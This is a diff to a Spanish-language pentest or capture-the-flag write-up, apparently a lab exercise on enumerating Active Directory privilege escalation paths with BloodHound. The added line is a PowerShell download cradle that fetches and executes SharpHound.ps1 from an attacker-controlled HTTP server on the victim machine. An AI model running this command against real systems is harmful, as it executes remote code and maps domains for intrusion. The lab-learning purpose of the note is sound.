@@ -153,5 +153,7 @@ Vamos a usar [[BLOODHOUND]] para enumerar las vías potenciales de escalada de p
 Obtendremos la información con la herramienta [[SHARPHOUND]]
 Nos compartiremos la `.ps1` levantando un servidor con Python y en la maquina victima usaremos
 ```shell
-
+IEX(New-object Net.webClient).downloadString('http://10.10.14.19/SharpHound.ps1')
 ```
+
+
